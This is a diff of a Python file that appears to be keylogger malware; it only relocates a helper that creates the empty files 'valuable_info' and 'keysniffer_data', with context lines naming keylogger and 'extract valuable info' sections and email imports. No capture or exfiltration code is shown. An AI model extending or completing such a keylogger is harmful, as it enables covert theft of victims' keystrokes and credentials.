@@ -15,42 +15,6 @@ from email import encoders
 
 import threading
 
-# ===================================================== File Existence Handling =====================================================
-
-# import os
-# import time
-
-
-def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
-    """
-    Check if the files exist, and create them if not, retrying a few times if they fail.
-    """
-    for attempt in range(retries):
-        # Check if the first file exists, if not, create it
-        if not os.path.exists(valuable_info):
-            with open(valuable_info, "w") as file:
-                file.write("")  # Create an empty file
-            print(f"Created missing file: {valuable_info}")
-
-        # Check if the second file exists, if not, create it
-        if not os.path.exists(keysniffer_data):
-            with open(keysniffer_data, "w") as file:
-                file.write("")  # Create an empty file
-            print(f"Created missing file: {keysniffer_data}")
-
-        # Check if both files now exist
-        if os.path.exists(valuable_info) and os.path.exists(keysniffer_data):
-            print(f"Both files are present: {valuable_info}, {keysniffer_data}")
-            return True
-        else:
-            print(
-                f"Files not found or created: {valuable_info}, {keysniffer_data}. Retrying {attempt + 1}/{retries}..."
-            )
-            time.sleep(delay)
-
-    print(f"Failed to ensure both files exist: {valuable_info}, {keysniffer_data}")
-    return False
-
 
 # ===================================================== Basic keylogger ================================================
 
@@ -96,6 +60,44 @@ def keylogger():
 
     except KeyboardInterrupt:
         print("Keylogger stopped.")
+
+
+# ===================================================== File Existence Handling =====================================================
+
+# import os
+# import time
+
+
+def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
+    """
+    Check if the files exist, and create them if not, retrying a few times if they fail.
+    """
+    for attempt in range(retries):
+        # Check if the first file exists, if not, create it
+        if not os.path.exists(valuable_info):
+            with open(valuable_info, "w") as file:
+                file.write("")  # Create an empty file
+            print(f"Created missing file: {valuable_info}")
+
+        # Check if the second file exists, if not, create it
+        if not os.path.exists(keysniffer_data):
+            with open(keysniffer_data, "w") as file:
+                file.write("")  # Create an empty file
+            print(f"Created missing file: {keysniffer_data}")
+
+        # Check if both files now exist
+        if os.path.exists(valuable_info) and os.path.exists(keysniffer_data):
+            print(f"Both files are present: {valuable_info}, {keysniffer_data}")
+            return True
+        else:
+            print(
+                f"Files not found or created: {valuable_info}, {keysniffer_data}. Retrying {attempt + 1}/{retries}..."
+            )
+            time.sleep(delay)
+
+    print(f"Failed to ensure both files exist: {valuable_info}, {keysniffer_data}")
+    return False
+
 
 
 # ===================================================== Filter and Extract Valuable Info ====================================
